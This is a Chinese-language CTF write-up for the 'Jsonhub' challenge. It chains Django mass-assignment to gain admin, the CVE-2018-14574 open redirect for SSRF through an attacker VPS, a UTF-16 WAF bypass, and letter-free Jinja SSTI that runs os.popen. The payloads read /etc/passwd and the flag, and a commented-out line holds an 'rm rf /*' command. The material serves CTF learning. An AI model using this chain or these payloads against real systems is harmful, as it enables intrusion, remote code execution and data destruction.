# Jsonhub
源码审计，预期是 成为Django-admin -> 利用CVE-2018-14574 造成SSRF打flask_rpc -> UTF16绕过 {{限制 -> 无字母SSTI
由于写的太急了忘记限制symbols为一个字符，非预期是直接利用symbols绕过

## 预期
### 成为admin
```python
def reg(request):
    if request.method == "GET":
        return render(request, "templates/reg.html")
    elif request.method == "POST":
        try:
            data = json.loads(request.body)
        except ValueError:
            return JsonResponse({"code": -1, "message": "Request data can't be unmarshal"})

        if len(User.objects.filter(username=data["username"])) != 0:
            return JsonResponse({"code": 1})
        User.objects.create_user(**data)
        return JsonResponse({"code": 0})
```
可以看到把json对象全部传入了create_user，这是python的一个语法，会把字典元素变为键值对作为函数参数，本意是方便开发
比如{"username":"admin", "password":"123456"} 即是 User.objects.create_user(username="admin",password="123456")
所以我们可以传入恶意键值对，在注册的时候直接变为admin，查阅文档或者翻下django项目的数据库找到对应列名
{"username":"admin","password":"123456","is_staff":1,"is_superuser":1}
即可成为admin

```
POST /reg/ HTTP/1.1
Host: 192.168.15.133:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 70
Origin: http://192.168.15.133:8000
Connection: close
Referer: http://192.168.15.133:8000/reg/

{"username":"admin","password":"123456","is_staff":1,"is_superuser":1}
```
然后登入admin后台，获取token
### CVE-2018-14574
Django < 2.0.8 存在任意URL跳转漏洞，我们可以通过这个来SSRF
由于path采用了re_path，我们只需要传入
http://39.104.19.182//8.8.8.8/login
即可跳转到任意url的login路由
```
POST /home/ HTTP/1.1
Host: 192.168.15.133:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: csrftoken=C1JAgkBIk8uqH9XF2CHBlsWDSPfOwNZHmj7RfnqqEdH1pqtPSvuNgxGNdodpZGta; sessionid=e8gd9dipyijy3t96hn5jujv1d0o90r0o
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

{"token":"xxxxxxxxxxxxxxxxxxxxxx","url":"http://39.104.19.182//8.8.8.8/login"}
```
由于python request库会自动跟随302
然后我们在自己的vps上搭一个服务，继续跳转到本地127.0.0.1:8000/flask_rpc
就可以SSRF访问flask_rpc开始打flask

### UTF16 && unicode
```python
@app.before_request
def before_request():
    data = str(request.data)
    log()
    if "{{" in data or "}}" in data or "{%" in data or "%}" in data:
        abort(401)
```
flask做了一个简单的waf，不允许ssti的关键字符，需要bypass
此处有两个办法
```python
@app.route('/caculator', methods=["POST"])
def caculator():
    try:
        data = request.get_json()
```
但是flask获取参数的方式又是get_json方法，我们跟入一下
```python
    def get_json(self, force=False, silent=False, cache=True):
        """Parse :attr:`data` as JSON.

        If the mimetype does not indicate JSON
        (:mimetype:`application/json`, see :meth:`is_json`), this
        returns ``None``.

        If parsing fails, :meth:`on_json_loading_failed` is called and
        its return value is used as the return value.

        :param force: Ignore the mimetype and always try to parse JSON.
        :param silent: Silence parsing errors and return ``None``
            instead.
        :param cache: Store the parsed JSON to return for subsequent
            calls.
        """
        if cache and self._cached_json[silent] is not Ellipsis:
            return self._cached_json[silent]

        if not (force or self.is_json):
            return None

        data = self._get_data_for_json(cache=cache)

        try:
            rv = self.json_module.loads(data)
        except ValueError as e:
            if silent:
                rv = None

                if cache:
                    normal_rv, _ = self._cached_json
                    self._cached_json = (normal_rv, rv)
            else:
                rv = self.on_json_loading_failed(e)

                if cache:
                    _, silent_rv = self._cached_json
                    self._cached_json = (rv, silent_rv)
        else:
            if cache:
                self._cached_json = (rv, rv)

        return rv
```
看到`rv = self.json_module.loads(data)`继续跟入
```python
    @staticmethod
    def loads(s, **kw):
        if isinstance(s, bytes):
            # Needed for Python < 3.6
            encoding = detect_utf_encoding(s)
            s = s.decode(encoding)

        return _json.loads(s, **kw)
```
```python
def detect_utf_encoding(data):
    """Detect which UTF encoding was used to encode the given bytes.

    The latest JSON standard (:rfc:`8259`) suggests that only UTF-8 is
    accepted. Older documents allowed 8, 16, or 32. 16 and 32 can be big
    or little endian. Some editors or libraries may prepend a BOM.

    :internal:

    :param data: Bytes in unknown UTF encoding.
    :return: UTF encoding name

    .. versionadded:: 0.15
    """
    head = data[:4]

    if head[:3] == codecs.BOM_UTF8:
        return "utf-8-sig"

    if b"\x00" not in head:
        return "utf-8"

    if head in (codecs.BOM_UTF32_BE, codecs.BOM_UTF32_LE):
        return "utf-32"

    if head[:2] in (codecs.BOM_UTF16_BE, codecs.BOM_UTF16_LE):
        return "utf-16"

    if len(head) == 4:
        if head[:3] == b"\x00\x00\x00":
            return "utf-32-be"

        if head[::2] == b"\x00\x00":
            return "utf-16-be"

        if head[1:] == b"\x00\x00\x00":
            return "utf-32-le"

        if head[1::2] == b"\x00\x00":
            return "utf-16-le"

    if len(head) == 2:
        return "utf-16-be" if head.startswith(b"\x00") else "utf-16-le"

    return "utf-8"
```
可以看到flask的get_json方法会通过传入的body自动判断编码然后解码，这就与之前的waf存在一个差异
我们可以把exp进行UTF16编码然后bypass waf
另一个办法就是\u unicode字符进行绕过
### bypass字母
好了{{我们已经可以bypass了，但是num还限制了不能有字母，这个怎么办
python里面，我们可以通过 '\123'来表示一个字符，我们就可以通过这个来bypass字母的限制
这个对应关系并不遵守Ascii，所以我们可以先遍历存入字典
```python
exp = "request"
dicc = []
exploit = ""
for i in range(256):
    eval("dicc.append('{}')".format("\\"+str(i)))
for i in exp:
    exploit += "\\\\"+ str(dicc.index(i))


print(exploit)
```
用这个脚本转换一下常规的SSTI

```python
data = r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[155]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\160\\157\\160\\145\\156\\50\\47\\143\\141\\164\\40\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144\\47\\51\\56\\162\\145\\141\\144\\50\\51')}}","num2":1,"symbols":"+"}'''

print(data.encode("utf-16"))

```
把两个脚本结合一下
```python
from flask import Flask, request, render_template_string,redirect
import re
import json
import string,random
import base64
app = Flask(__name__)
from urllib.parse import quote


#exp = "__import__('os').popen('rm rf /*').read()"
#exp = "__import__('os').popen('cat /flag').read()"
exp = "__import__('os').popen('/readflag').read()"
dicc = []
exploit = ""
for i in range(256):
    eval("dicc.append('{}')".format("\\"+str(i)))
for i in exp:
    exploit += "\\\\"+ str(dicc.index(i))

@app.route('/login/')
def index():
    # data = r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[155]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\160\\157\\160\\145\\156\\50\\47\\143\\141\\164\\40\\57\\145\\164\\143\\57\\160\\141\\163\\163\\167\\144\\47\\51\\56\\162\\145\\141\\144\\50\\51')}}","num2":1,"symbols":"+"}'''.encode("utf16")
    data = (r'''{"num1":"{{()['\\137\\137\\143\\154\\141\\163\\163\\137\\137']['\\137\\137\\142\\141\\163\\145\\163\\137\\137'][0]['\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137']()[64]['\\137\\137\\151\\156\\151\\164\\137\\137']['\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137']['\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137']['\\145\\166\\141\\154']('%s')}}","num2":1,"symbols":"+"}''' % exploit).encode("utf16")

    data = quote(base64.b64encode(data))
    return redirect("http://127.0.0.1:8000/rpc/?methods=POST&url=http%3a//127.0.0.1%3a5000/caculator&mime=application/json&data="+data)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000,debug=True)

```
vps上搭好后，向home路由请求一下自己的vps即可看到flag
